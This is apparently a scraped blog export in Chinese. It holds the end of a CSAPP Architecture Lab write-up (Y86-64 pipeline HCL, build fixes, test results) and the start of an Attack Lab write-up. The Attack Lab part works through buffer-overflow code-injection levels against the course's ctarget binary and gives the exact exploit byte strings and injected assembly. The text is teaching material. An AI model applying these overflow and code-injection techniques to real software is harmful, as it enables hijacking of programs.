Call. Use instruction constant icode == ICALL : valC; # Taken branch. Use instruction constant icode == IJXX \u0026amp;\u0026amp; Cnd : valC; # Completion of RET instruction. Use value from stack icode == IRET : valM; # Default: Use incremented PC 1 : valP; ]; #/* $end seq-all-hcl */ 接下来，检验一下修改对不对：\n$ make VERSION=full # Building the seq-full.hcl version of SEQ ../misc/hcl2c -n seq-full.hcl \u0026lt;seq-full.hcl \u0026gt;seq-full.c gcc -Wall -O2 -isystem /usr/include/tcl8.5 -I../misc -DHAS_GUI -o ssim \\ seq-full.c ssim.c ../misc/isa.c -L/usr/lib -ltk -ltcl -lm ssim.c:20:10: fatal error: tk.h: No such file or directory 20 | #include \u0026lt;tk.h\u0026gt; | ^~~~~~ compilation terminated. make: *** [Makefile:44: ssim] Error 1 ...... $ make VERSION=full /usr/bin/ld: /tmp/ccbOoipJ.o:(.data.rel+0x0): undefined reference to `matherr' collect2: error: ld returned 1 exit status make: *** [Makefile:44: ssim] Error 1 我在执行make VERSION=full命令的时候，报了上面的两个错误，对于第一个错误，这个刚开始一样只需执行下面两条命令：\n$ sed -i \u0026quot;s/tcl8.5/tcl8.6/g\u0026quot; Makefile $ sed -i \u0026quot;s/CFLAGS=/CFLAGS=-DUSE_INTERP_RESULT /g\u0026quot; Makefile 对于第二个错误，undefined reference to matherr。我们可以在ssim.c找到matherr,然后注释掉那两行，因为没有用到。\n修改完后，重新执行：\n$ make VERSION=full $ (cd ../ptest; make SIM=../seq/ssim TFLAGS=-i) ./optest.pl -s ../seq/ssim -i Simulating with ../seq/ssim Test op-iaddq-256-rdx failed Test op-iaddq-4-rdx failed Test op-iaddq-256-rbx failed Test op-iaddq-4-rbx failed Test op-iaddq-256-rsp failed Test op-iaddq-4-rsp failed 6/58 ISA Checks Failed ./jtest.pl -s ../seq/ssim -i Simulating with ../seq/ssim Test ji-jle-64-32 failed Test ji-jl-32-64 failed Test ji-je-32-64 failed Test ji-je-64-32 failed Test ji-jne-32-64 failed Test ji-jne-64-32 failed Test ji-jge-32-64 failed Test ji-jg-64-32 failed 8/96 ISA Checks Failed ./ctest.pl -s ../seq/ssim -i Simulating with ../seq/ssim All 22 ISA Checks Succeed ./htest.pl -s ../seq/ssim -i Simulating with ../seq/ssim All 756 ISA Checks Succeed 当看到All 756 ISA Checks Succeed就是成功了。\nPart C 这里我们要做的就是修改 sim/pipe/pipe-full.hcl 以及 sim/pipe/ncopy.ys 的内容。使我们的程序运行效率尽量高。在为 pipe-full.hcl 实现完 iaddq 之后。我们就可以分别使用如下指令测试我们的代码：\n$ ./correctness.pl #结果是否正确 $ ./benchmark.pl #得出效率，分数越高结果越好 修改之后的pipe-full.hcl文件：\n#/* $begin pipe-all-hcl */ #################################################################### # HCL Description of Control for Pipelined Y86-64 Processor # # Copyright (C) Randal E. Bryant, David R. O'Hallaron, 2014 # #################################################################### ## Your task is to implement the iaddq instruction ## The file contains a declaration of the icodes ## for iaddq (IIADDQ) ## Your job is to add the rest of the logic to make it work #################################################################### # C Include's. Don't alter these # #################################################################### quote '#include \u0026lt;stdio.h\u0026gt;' quote '#include \u0026quot;isa.h\u0026quot;' quote '#include \u0026quot;pipeline.h\u0026quot;' quote '#include \u0026quot;stages.h\u0026quot;' quote '#include \u0026quot;sim.h\u0026quot;' quote 'int sim_main(int argc, char *argv[]);' quote 'int main(int argc, char *argv[]){return sim_main(argc,argv);}' #################################################################### # Declarations. Do not change/remove/delete any of these # #################################################################### ##### Symbolic representation of Y86-64 Instruction Codes ############# wordsig INOP 'I_NOP' wordsig IHALT 'I_HALT' wordsig IRRMOVQ 'I_RRMOVQ' wordsig IIRMOVQ 'I_IRMOVQ' wordsig IRMMOVQ 'I_RMMOVQ' wordsig IMRMOVQ 'I_MRMOVQ' wordsig IOPQ 'I_ALU' wordsig IJXX 'I_JMP' wordsig ICALL 'I_CALL' wordsig IRET 'I_RET' wordsig IPUSHQ 'I_PUSHQ' wordsig IPOPQ 'I_POPQ' # Instruction code for iaddq instruction wordsig IIADDQ 'I_IADDQ' ##### Symbolic represenations of Y86-64 function codes ##### wordsig FNONE 'F_NONE' # Default function code ##### Symbolic representation of Y86-64 Registers referenced ##### wordsig RRSP 'REG_RSP' # Stack Pointer wordsig RNONE 'REG_NONE' # Special value indicating \u0026quot;no register\u0026quot; ##### ALU Functions referenced explicitly ########################## wordsig ALUADD 'A_ADD' # ALU should add its arguments ##### Possible instruction status values ##### wordsig SBUB 'STAT_BUB' # Bubble in stage wordsig SAOK 'STAT_AOK' # Normal execution wordsig SADR 'STAT_ADR' # Invalid memory address wordsig SINS 'STAT_INS' # Invalid instruction wordsig SHLT 'STAT_HLT' # Halt instruction encountered ##### Signals that can be referenced by control logic ############## ##### Pipeline Register F ########################################## wordsig F_predPC 'pc_curr-\u0026gt;pc' # Predicted value of PC ##### Intermediate Values in Fetch Stage ########################### wordsig imem_icode 'imem_icode' # icode field from instruction memory wordsig imem_ifun 'imem_ifun' # ifun field from instruction memory wordsig f_icode 'if_id_next-\u0026gt;icode' # (Possibly modified) instruction code wordsig f_ifun 'if_id_next-\u0026gt;ifun' # Fetched instruction function wordsig f_valC 'if_id_next-\u0026gt;valc' # Constant data of fetched instruction wordsig f_valP 'if_id_next-\u0026gt;valp' # Address of following instruction boolsig imem_error 'imem_error' # Error signal from instruction memory boolsig instr_valid 'instr_valid' # Is fetched instruction valid? ##### Pipeline Register D ########################################## wordsig D_icode 'if_id_curr-\u0026gt;icode' # Instruction code wordsig D_rA 'if_id_curr-\u0026gt;ra' # rA field from instruction wordsig D_rB 'if_id_curr-\u0026gt;rb' # rB field from instruction wordsig D_valP 'if_id_curr-\u0026gt;valp' # Incremented PC ##### Intermediate Values in Decode Stage ######################### wordsig d_srcA 'id_ex_next-\u0026gt;srca' # srcA from decoded instruction wordsig d_srcB 'id_ex_next-\u0026gt;srcb' # srcB from decoded instruction wordsig d_rvalA 'd_regvala' # valA read from register file wordsig d_rvalB 'd_regvalb' # valB read from register file ##### Pipeline Register E ########################################## wordsig E_icode 'id_ex_curr-\u0026gt;icode' # Instruction code wordsig E_ifun 'id_ex_curr-\u0026gt;ifun' # Instruction function wordsig E_valC 'id_ex_curr-\u0026gt;valc' # Constant data wordsig E_srcA 'id_ex_curr-\u0026gt;srca' # Source A register ID wordsig E_valA 'id_ex_curr-\u0026gt;vala' # Source A value wordsig E_srcB 'id_ex_curr-\u0026gt;srcb' # Source B register ID wordsig E_valB 'id_ex_curr-\u0026gt;valb' # Source B value wordsig E_dstE 'id_ex_curr-\u0026gt;deste' # Destination E register ID wordsig E_dstM 'id_ex_curr-\u0026gt;destm' # Destination M register ID ##### Intermediate Values in Execute Stage ######################### wordsig e_valE 'ex_mem_next-\u0026gt;vale' # valE generated by ALU boolsig e_Cnd 'ex_mem_next-\u0026gt;takebranch' # Does condition hold? wordsig e_dstE 'ex_mem_next-\u0026gt;deste' # dstE (possibly modified to be RNONE) ##### Pipeline Register M ######################### wordsig M_stat 'ex_mem_curr-\u0026gt;status' # Instruction status wordsig M_icode 'ex_mem_curr-\u0026gt;icode' # Instruction code wordsig M_ifun 'ex_mem_curr-\u0026gt;ifun' # Instruction function wordsig M_valA 'ex_mem_curr-\u0026gt;vala' # Source A value wordsig M_dstE 'ex_mem_curr-\u0026gt;deste' # Destination E register ID wordsig M_valE 'ex_mem_curr-\u0026gt;vale' # ALU E value wordsig M_dstM 'ex_mem_curr-\u0026gt;destm' # Destination M register ID boolsig M_Cnd 'ex_mem_curr-\u0026gt;takebranch' # Condition flag boolsig dmem_error 'dmem_error' # Error signal from instruction memory ##### Intermediate Values in Memory Stage ########################## wordsig m_valM 'mem_wb_next-\u0026gt;valm' # valM generated by memory wordsig m_stat 'mem_wb_next-\u0026gt;status' # stat (possibly modified to be SADR) ##### Pipeline Register W ########################################## wordsig W_stat 'mem_wb_curr-\u0026gt;status' # Instruction status wordsig W_icode 'mem_wb_curr-\u0026gt;icode' # Instruction code wordsig W_dstE 'mem_wb_curr-\u0026gt;deste' # Destination E register ID wordsig W_valE 'mem_wb_curr-\u0026gt;vale' # ALU E value wordsig W_dstM 'mem_wb_curr-\u0026gt;destm' # Destination M register ID wordsig W_valM 'mem_wb_curr-\u0026gt;valm' # Memory M value #################################################################### # Control Signal Definitions. # #################################################################### ################ Fetch Stage ################################### ## What address should instruction be fetched at word f_pc = [ # Mispredicted branch. Fetch at incremented PC M_icode == IJXX \u0026amp;\u0026amp; !M_Cnd : M_valA; # Completion of RET instruction W_icode == IRET : W_valM; # Default: Use predicted value of PC 1 : F_predPC; ]; ## Determine icode of fetched instruction word f_icode = [ imem_error : INOP; 1: imem_icode; ]; # Determine ifun word f_ifun = [ imem_error : FNONE; 1: imem_ifun; ]; # Is instruction valid? bool instr_valid = f_icode in { INOP, IHALT, IRRMOVQ, IIRMOVQ, IRMMOVQ, IMRMOVQ, IOPQ, IJXX, ICALL, IRET, IPUSHQ, IPOPQ ,IIADDQ }; # Determine status code for fetched instruction word f_stat = [ imem_error: SADR; !instr_valid : SINS; f_icode == IHALT : SHLT; 1 : SAOK; ]; # Does fetched instruction require a regid byte? bool need_regids = f_icode in { IRRMOVQ, IOPQ, IPUSHQ, IPOPQ, IIRMOVQ, IRMMOVQ, IMRMOVQ,IIADDQ }; # Does fetched instruction require a constant word? bool need_valC = f_icode in { IIRMOVQ, IRMMOVQ, IMRMOVQ, IJXX, ICALL,IIADDQ }; # Predict next value of PC word f_predPC = [ f_icode in { IJXX, ICALL } : f_valC; 1 : f_valP; ]; ################ Decode Stage ###################################### ## What register should be used as the A source? word d_srcA = [ D_icode in { IRRMOVQ, IRMMOVQ, IOPQ, IPUSHQ } : D_rA; D_icode in { IPOPQ, IRET } : RRSP; 1 : RNONE; # Don't need register ]; ## What register should be used as the B source? word d_srcB = [ D_icode in { IOPQ, IRMMOVQ, IMRMOVQ } : D_rB; D_icode in { IPUSHQ, IPOPQ, ICALL, IRET } : RRSP; 1 : RNONE; # Don't need register ]; ## What register should be used as the E destination? word d_dstE = [ D_icode in { IRRMOVQ, IIRMOVQ, IOPQ} : D_rB; D_icode in { IPUSHQ, IPOPQ, ICALL, IRET } : RRSP; 1 : RNONE; # Don't write any register ]; ## What register should be used as the M destination? word d_dstM = [ D_icode in { IMRMOVQ, IPOPQ } : D_rA; 1 : RNONE; # Don't write any register ]; ## What should be the A value? ## Forward into decode stage for valA word d_valA = [ D_icode in { ICALL, IJXX } : D_valP; # Use incremented PC d_srcA == e_dstE : e_valE; # Forward valE from execute d_srcA == M_dstM : m_valM; # Forward valM from memory d_srcA == M_dstE : M_valE; # Forward valE from memory d_srcA == W_dstM : W_valM; # Forward valM from write back d_srcA == W_dstE : W_valE; # Forward valE from write back 1 : d_rvalA; # Use value read from register file ]; word d_valB = [ d_srcB == e_dstE : e_valE; # Forward valE from execute d_srcB == M_dstM : m_valM; # Forward valM from memory d_srcB == M_dstE : M_valE; # Forward valE from memory d_srcB == W_dstM : W_valM; # Forward valM from write back d_srcB == W_dstE : W_valE; # Forward valE from write back 1 : d_rvalB; # Use value read from register file ]; ################ Execute Stage ##################################### ## Select input A to ALU word aluA = [ E_icode in { IRRMOVQ, IOPQ } : E_valA; E_icode in { IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ } : E_valC; E_icode in { ICALL, IPUSHQ } : -8; E_icode in { IRET, IPOPQ } : 8; # Other instructions don't need ALU ]; ## Select input B to ALU word aluB = [ E_icode in { IRMMOVQ, IMRMOVQ, IOPQ, ICALL, IPUSHQ, IRET, IPOPQ, IIADDQ } : E_valB; E_icode in { IRRMOVQ, IIRMOVQ } : 0; # Other instructions don't need ALU ]; ## Set the ALU function word alufun = [ E_icode == IOPQ : E_ifun; 1 : ALUADD; ]; ## Should the condition codes be updated? bool set_cc = E_icode == IOPQ \u0026amp;\u0026amp; # State changes only during normal operation !m_stat in { SADR, SINS, SHLT } \u0026amp;\u0026amp; !W_stat in { SADR, SINS, SHLT }; ## Generate valA in execute stage word e_valA = E_valA; # Pass valA through stage ## Set dstE to RNONE in event of not-taken conditional move word e_dstE = [ E_icode == IRRMOVQ \u0026amp;\u0026amp; !e_Cnd : RNONE; 1 : E_dstE; ]; ################ Memory Stage ###################################### ## Select memory address word mem_addr = [ M_icode in { IRMMOVQ, IPUSHQ, ICALL, IMRMOVQ } : M_valE; M_icode in { IPOPQ, IRET } : M_valA; # Other instructions don't need address ]; ## Set read control signal bool mem_read = M_icode in { IMRMOVQ, IPOPQ, IRET }; ## Set write control signal bool mem_write = M_icode in { IRMMOVQ, IPUSHQ, ICALL }; #/* $begin pipe-m_stat-hcl */ ## Update the status word m_stat = [ dmem_error : SADR; 1 : M_stat; ]; #/* $end pipe-m_stat-hcl */ ## Set E port register ID word w_dstE = W_dstE; ## Set E port value word w_valE = W_valE; ## Set M port register ID word w_dstM = W_dstM; ## Set M port value word w_valM = W_valM; ## Update processor status word Stat = [ W_stat == SBUB : SAOK; 1 : W_stat; ]; ################ Pipeline Register Control ######################### # Should I stall or inject a bubble into Pipeline Register F? # At most one of these can be true. bool F_bubble = 0; bool F_stall = # Conditions for a load/use hazard E_icode in { IMRMOVQ, IPOPQ } \u0026amp;\u0026amp; E_dstM in { d_srcA, d_srcB } || # Stalling at fetch while ret passes through pipeline IRET in { D_icode, E_icode, M_icode }; # Should I stall or inject a bubble into Pipeline Register D? # At most one of these can be true. bool D_stall = # Conditions for a load/use hazard E_icode in { IMRMOVQ, IPOPQ } \u0026amp;\u0026amp; E_dstM in { d_srcA, d_srcB }; bool D_bubble = # Mispredicted branch (E_icode == IJXX \u0026amp;\u0026amp; !e_Cnd) || # Stalling at fetch while ret passes through pipeline # but not condition for a load/use hazard !(E_icode in { IMRMOVQ, IPOPQ } \u0026amp;\u0026amp; E_dstM in { d_srcA, d_srcB }) \u0026amp;\u0026amp; IRET in { D_icode, E_icode, M_icode }; # Should I stall or inject a bubble into Pipeline Register E? # At most one of these can be true. bool E_stall = 0; bool E_bubble = # Mispredicted branch (E_icode == IJXX \u0026amp;\u0026amp; !e_Cnd) || # Conditions for a load/use hazard E_icode in { IMRMOVQ, IPOPQ } \u0026amp;\u0026amp; E_dstM in { d_srcA, d_srcB}; # Should I stall or inject a bubble into Pipeline Register M? # At most one of these can be true. bool M_stall = 0; # Start injecting bubbles as soon as exception passes through memory stage bool M_bubble = m_stat in { SADR, SINS, SHLT } || W_stat in { SADR, SINS, SHLT }; # Should I stall or inject a bubble into Pipeline Register W? bool W_stall = W_stat in { SADR, SINS, SHLT }; bool W_bubble = 0; #/* $end pipe-all-hcl */ 测试一下正确性：\n$ ./correctness.pl Simulating with instruction set simulator yis ncopy 0 OK 1 OK 2 OK 3 OK 4 OK 5 OK 6 OK 7 OK 8 OK 9 OK 10 OK 11 OK 12 OK 13 OK 14 OK 15 OK 16 OK 17 OK 18 OK 19 OK 20 OK 21 OK 22 OK 23 OK 24 OK 25 OK 26 OK 27 OK 28 OK 29 OK 30 OK 31 OK 32 OK 33 OK 34 OK 35 OK 36 OK 37 OK 38 OK 39 OK 40 OK 41 OK 42 OK 43 OK 44 OK 45 OK 46 OK 47 OK 48 OK 49 OK 50 OK 51 OK 52 OK 53 OK 54 OK 55 OK 56 OK 57 OK 58 OK 59 OK 60 OK 61 OK 62 OK 63 OK 64 OK 128 OK 192 OK 256 OK 68/68 pass correctness test ​\t优化就没有做了，可以从CPU流水线特性考虑优化策略\n总结 这次的实验让我对CPU的取指过程有了更深了解，自己尝试写汇编代码，刚开始也是会报很多错，然后又回去看代码，最后成功解决，锻炼了肉眼debug能力哈哈\n","id":5,"section":"posts","summary":"CSAPP\u0026ndash;Architecture Lab实验记录 实验准备 实验资料 《深入理解计算机系统》第四章 处理器体系结构 lab官网 环境搭建 博主用的是 linux （ubuntu20.04） 1、首先下","tags":["csapp-lab"],"title":"CSAPP--Architecture Lab实验记录","uri":"https://lincx-911.github.io/2021/12/architecture_lab/","year":"2021"},{"content":"CSAPP\u0026ndash;Attack Lab实验记录 前言 这个实验是csapp lab系列的第三个实验，实验内容主要是通过一些“攻击”手段，让我们了解缓冲区溢出隐患以及如何利用缓冲区溢出对现有的程序进行控制流劫持、执行非法程序\u0026hellip;\u0026hellip;\n实验准备 实验资料 《深入理解计算机系统》3.10.2~3.10.5 实验指导书\u0026ndash;writeup GDB的使用 x64_cheatsheet 相关知识 c语言对数组的引用不进行任何边界检查，而局部变量和状态信息（如保存寄存器的值和返回地址）都放到了栈中。多数组进行写操作越界的时候，会破环存储在栈中的状态信息。当程序使用这个被破环的状态，试图重新加载寄存器或执行ret指令时，就会出现很严重的错误。例如，缓冲区溢出。\n下面通过书上的例子，说明问题：\n/** echo.c 参照书籍中的代码*/ #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; void explosion(){ printf(\u0026quot;!!!You touch the explosion\u0026quot;); exit(0); } /* Implementation of library function gets() */ char *custom_gets(char *s){ int c; char *dest = s; while((c = getchar()) != '\\n' \u0026amp;\u0026amp; c != EOF) *dest++ = c; if(c == EOF \u0026amp;\u0026amp; dest == s) /* No characters read */ return NULL; *dest++ = '\\0'; /* Terminate string */ return s; } /** Read input line and write it back */ void echo(){ char buf[8]; custom_gets(buf); puts(buf); } int main(int argc, char* argv[]){ echo(); return 0; } 检查GCC 为 echo产生的汇编代码，看看栈是如何组织的：\necho: subq $24, %rsp movq %rsp, %rdi call custom_gets movq %rsp, %rdi call puts addq $24, %rsp ret 从汇编代码中可以看出，该程序在栈上为字符数组分配了24个字节。所以用户定义的字符数组为8个字节，意味着即使用户输入超过8个字节也不一定会对栈的状态信息造成破坏。但是如果用户输入超过23个字节，则会将echo的返回地址给破坏，这就是缓冲区溢出漏洞。\n实验目录 首先下载实验文件，然后解压，可以看到lab的目录如下：\ncookie.txt 一个8为16进行数，作为攻击的特殊标志符\nfarm.c 在ROP攻击中作为gadgets的产生源\nctarget 代码注入攻击的目标文件\nrtarget ROP攻击的目标文件\nhex2row 将16进制数转化为攻击字符，因为有些字符在屏幕上面无法输入，所以输入该字符的16进制数，自动转化为该字符\n实验内容 Part I: Code Injection Attacks level 1 For Phase 1, you will not inject new code. Instead, your exploit string will redirect the program to execute an existing procedure.\nFunction getbuf is called within CTARGET by a function test having the following C code:\nvoid test() { int val; val = getbuf(); printf(\u0026quot;No exploit. Getbuf returned 0x%x\\n\u0026quot;, val); } When getbuf executes its return statement (line 5 of getbuf), the program ordinarily resumes execution within function test (at line 5 of this function). We want to change this behavior. Within the file ctarget, there is code for a function touch1 having the following C representation:\nvoid touch1() { vlevel = 1; /* Part of validation protocol */ printf(\u0026quot;Touch1!: You called touch1()\\n\u0026quot;); validate(1); exit(0); } Your task is to get CTARGET to execute the code for touch1 when getbuf executes its return statement, rather than returning to test. Note that your exploit string may also corrupt parts of the stack not directly related to this stage, but this will not cause a problem, since touch1 causes the program to exit directly.\nSome Advice:\nAll the information you need to devise your exploit string for this level can be determined by examining a disassembled version of CTARGET. Use objdump -d to get this dissembled version. The idea is to position a byte representation of the starting address for touch1 so that the ret instruction at the end of the code for getbuf will transfer control to touch1. Be careful about byte ordering. • You might want to use GDB to step the program through the last few instructions of getbuf to make sure it is doing the right thing. The placement of buf within the stack frame for getbuf depends on the value of compile-time constant BUFFER_SIZE, as well the allocation strategy used by GCC. You will need to examine the disassembled code to determine its position. 上面是level 的实验任务介绍，大体意思就是让我们对 ctarget这个程序的test函数中调用的getbuf函数进行输入内容，利用溢出，调用touch1函数。\n首先我们可以反编译整个ctarget输出内容daoctarget.asm文件中（推荐）\n$ objdump -d ctarget \u0026gt; ctarget.asm 这样就可以得到整个程序的汇编内容。或者也可以利用gdb disas命令查看想要查看的函数的汇编代码：\n(gdb) disas touch1 Dump of assembler code for function touch1: 0x00000000004017c0 \u0026lt;+0\u0026gt;: sub $0x8,%rsp 0x00000000004017c4 \u0026lt;+4\u0026gt;: movl $0x1,0x202d0e(%rip) # 0x6044dc \u0026lt;vlevel\u0026gt; 0x00000000004017ce \u0026lt;+14\u0026gt;: mov $0x4030c5,%edi 0x00000000004017d3 \u0026lt;+19\u0026gt;: callq 0x400cc0 \u0026lt;puts@plt\u0026gt; 0x00000000004017d8 \u0026lt;+24\u0026gt;: mov $0x1,%edi 0x00000000004017dd \u0026lt;+29\u0026gt;: callq 0x401c8d \u0026lt;validate\u0026gt; 0x00000000004017e2 \u0026lt;+34\u0026gt;: mov $0x0,%edi 0x00000000004017e7 \u0026lt;+39\u0026gt;: callq 0x400e40 \u0026lt;exit@plt\u0026gt; 而我们现在主要需要关注的是test跟getbuf函数，因为要观察它们的缓冲区大小，才能直到溢出的临界值是多少，在ctarget.asm 文件中查找这两个函数名，得到它们的汇编代码：\n00000000004017a8 \u0026lt;getbuf\u0026gt;: 4017a8:\t48 83 ec 28 sub $0x28,%rsp 4017ac:\t48 89 e7 mov %rsp,%rdi 4017af:\te8 8c 02 00 00 callq 401a40 \u0026lt;Gets\u0026gt; 4017b4:\tb8 01 00 00 00 mov $0x1,%eax 4017b9:\t48 83 c4 28 add $0x28,%rsp 4017bd:\tc3 retq 4017be:\t90 nop 4017bf:\t90 nop ...... 0000000000401968 \u0026lt;test\u0026gt;: 401968:\t48 83 ec 08 sub $0x8,%rsp 40196c:\tb8 00 00 00 00 mov $0x0,%eax 401971:\te8 32 fe ff ff callq 4017a8 \u0026lt;getbuf\u0026gt; 401976:\t89 c2 mov %eax,%edx 401978:\tbe 88 31 40 00 mov $0x403188,%esi 40197d:\tbf 01 00 00 00 mov $0x1,%edi 401982:\tb8 00 00 00 00 mov $0x0,%eax 401987:\te8 64 f4 ff ff callq 400df0 \u0026lt;__printf_chk@plt\u0026gt; 40198c:\t48 83 c4 08 add $0x8,%rsp 401990:\tc3 retq 401991:\t90 nop 401992:\t90 nop 401993:\t90 nop 401994:\t90 nop 401995:\t90 nop 401996:\t90 nop 401997:\t90 nop 401998:\t90 nop 401999:\t90 nop 40199a:\t90 nop 40199b:\t90 nop 40199c:\t90 nop 40199d:\t90 nop 40199e:\t90 nop 40199f:\t90 nop 可以看到sub $0x28,%rsp这里就是在栈上分配给缓冲区的大小空间：0x28 = 40字节。所以只需要在输入40字节内容 后面再加上 touch1的地址的话，就能将原来test函数的地址覆盖，retq指令将跳转到touch1。我们试验一下：\n首先，查看一下touch1的地址\n0x00000000004017c0 然后新建一个文件ctarget.l1.txt用来存储我们输入的内容，这里前40个字节 都用 00 来填充，最后输入touch1的地址，注意，这里的地址是反过来写，因为机器存的是小端序，低位字节存在低位地址:\n$ vim ctarget.l1.txt 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 然后运行看看结果：\n$ ./hex2raw -i ctarget.l1.txt | ./ctarget -q Cookie: 0x59b997fa Type string:Touch1!: You called touch1() Valid solution for level 1 with target ctarget PASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 顺利完成！\nlevel 2 Phase 2 involves injecting a small amount of code as part of your exploit string. Within the file ctarget there is code for a function touch2 having the following C representation:\nvoid touch2(unsigned val) { vlevel = 2; /* Part of validation protocol */ if (val == cookie) { printf(\u0026quot;Touch2!: You called touch2(0x%.8x)\\n\u0026quot;, val); validate(2); } else { printf(\u0026quot;Misfire: You called touch2(0x%.8x)\\n\u0026quot;, val); fail(2); } exit(0); } Your task is to get CTARGET to execute the code for touch2 rather than returning to test. In this case, however, you must make it appear to touch2 as if you have passed your cookie as its argument.\nSome Advice:\nYou will want to position a byte representation of the address of your injected code in such a way that ret instruction at the end of the code for getbuf will transfer control to it. Recall that the first argument to a function is passed in register %rdi. Your injected code should set the register to your cookie, and then use a ret instruction to transfer control to the first instruction in touch2. Do not attempt to use jmp or call instructions in your exploit code. The encodings of destination addresses for these instructions are difficult to formulate. Use ret instructions for all transfers of control, even when you are not returning from a call. See the discussion in Appendix B on how to use tools to generate the byte-level representations of instruction sequences. 从上文可以看到，这个任务主要是让我们注入一段代码，执行touch2函数，然后比较传入的val是否与cookie值相等，相等则成功。实验要求我们不能通过jmp或者call指令来跳转，只能通过ret。\nret是从栈上弹出返回地址，所以要想跳转至touch2，那么我们就需要在栈顶弹入touch2的地址。\n所以我们可以先整理一下思路：\n在ctarget.asm文件中查看touch2函数的地址 编写插入的汇编代码，然后编译得到指令 将指令插入到我们需要输入的字符串开头 在末尾插入跳转的地址（%rsp） 首先，查看touch2函数的地址\n0x4017ec 接着，获取%rsp 的值0x5561dc78\n$ gdb ctarget (gdb) break getbuf Breakpoint 1 at 0x4017a8: file buf.c, line 12. (gdb) run -q Starting program: /home/lincx/c++/CSAPP-Labs-master/labs/source/labfile/target1/ctarget -q Cookie: 0x59b997fa Breakpoint 1, getbuf () at buf.c:12 12 buf.c: No such file or directory. (gdb) stepi 14 in buf.c (gdb) p /x %rsp A syntax error in expression, near `%rsp'. (gdb) p /x $rsp $1 = 0x5561dc78 然后，新建ctarget.s文件编写插入的汇编代码：\nmov $0x59b997fa,%rdi pushq $0x4017ec ret 编译，得到汇编指令48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3：\n$ objdump -d ctarget2.o \u0026gt; ctarget2insert.asm $ vim ctarget2insert.asm ctarget2.o: file format elf64-x86-64 Disassembly of section .text: 0000000000000000 \u0026lt;.text\u0026gt;: 0: 48 c7 c7 fa 97 b9 59 mov $0x59b997fa,%rdi 7: 68 ec 17 40 00 pushq 0x4017ec e: c3 retq 构造输入字符，新建ctarget.l2.txt：\n$ vim ctarget.l2.txt 48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 执行命令，查看结果：\n$ ./hex2raw -i ctarget.l2.txt | ./ctarget -q Cookie: 0x59b997fa Type string:Touch2!: You called touch2(0x59b997fa) Valid solution for level 2 with target ctarget PASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 level 3 Phase 3 also involves a code injection attack, but passing a string as argument. Within the file ctarget there is code for functions hexmatch and touch3 having the following C representations:\n/* Compare string to hex represention of unsigned value */ int hexmatch(unsigned val, char *sval){ char cbuf[110]; /* Make position of check string unpredictable */ char *s = cbuf + random() % 100; sprintf(s, \u0026quot;%.8x\u0026quot;, val); return strncmp(sval, s, 9) == 0; } void touch3(char *sval){ vlevel = 3; if (hexmatch(cookie, sval)){ printf(\u0026quot;Touch3!: You called touch3(\\\u0026quot;%s\\\u0026quot;)\\n\u0026quot;, sval); validate(3); } else { printf(\u0026quot;Misfire: You called touch3(\\\u0026quot;%s\\\u0026quot;)\\n\u0026quot;, sval); fail(3); } exit(0); } Your task is to get CTARGET to execute the code for touch3 rather than returning to test. You must make it appear to touch3 as if you have passed a string representation of your cookie as its argument.\nSome Advice:\nYou will need to include a string representation of your cookie in your exploit string. The string should consist of the eight hexadecimal digits (ordered from most to least significant) without a leading “0x.” Recall that a string is represented in C as a sequence of bytes followed by a byte with value 0. Type “man ascii” on any Linux machine to see the byte representations of the characters you need. Your injected code should set register %rdi to the address of this string. When functions hexmatch and strncmp are called, they push data onto the stack, overwriting portions of memory that held the buffer used by getbuf. As a result, you will need to be careful where you place the string representation of your cookie. 与前面不同的是，这次传进的参数是一个字符串，同时函数内部用了另外一个函数来比较。本次要 比较的是\u0026quot;59b997fa\u0026quot;这个字符串。\n上面提示的第四点，当调用hexmatch和strncmp时，他们会把数据压入到栈中，有可能会覆盖getbuf栈帧的数据，所以传进去字符串的位置必须小心谨慎。\nchar *s = cbuf + random() % 100; 这一行，s的位置是随机的，可能覆盖掉之前getbuf的内容。所以不能将字符串保存在getbuf中，我们可以将字符串保存到父栈帧test中。\n(gdb) disas test Dump of assembler code for function test: 0x0000000000401968 \u0026lt;+0\u0026gt;: sub $0x8,%rsp 0x000000000040196c \u0026lt;+4\u0026gt;: mov $0x0,%eax 0x0000000000401971 \u0026lt;+9\u0026gt;: callq 0x4017a8 \u0026lt;getbuf\u0026gt; 0x0000000000401976 \u0026lt;+14\u0026gt;: mov %eax,%edx 0x0000000000401978 \u0026lt;+16\u0026gt;: mov $0x403188,%esi 0x000000000040197d \u0026lt;+21\u0026gt;: mov $0x1,%edi 0x0000000000401982 \u0026lt;+26\u0026gt;: mov $0x0,%eax 0x0000000000401987 \u0026lt;+31\u0026gt;: callq 0x400df0 \u0026lt;__printf_chk@plt\u0026gt; 0x000000000040198c \u0026lt;+36\u0026gt;: add $0x8,%rsp 0x0000000000401990 \u0026lt;+40\u0026gt;: retq (gdb) break *0x40196c Breakpoint 1 at 0x40196c: file visible.c, line 92. (gdb) run -q Starting program: /home/lincx/c++/CSAPP-Labs-master/labs/source/labfile/target1/ctarget -q Cookie: 0x59b997fa Breakpoint 1, test () at visible.c:92 92 visible.c: No such file or directory. (gdb) print /x $rsp $1 = 0x5561dca8 所以我们可以：\n将cookie的值转为16进制 然后写到test栈帧中，再将地址传到%rdi 将touch3地址压栈，同level 2 首先，编写汇编代码：\nmov $0x5561dca8,%rdi pushq $0x4018fa ret 编译，查看指令：\n$ gcc -c ctarget3.s $ objdump -d ctarget3.o \u0026gt; ctarget3insert.asm $ cat ctarget3insert.asm ctarget3.o: file format elf64-x86-64 Disassembly of section 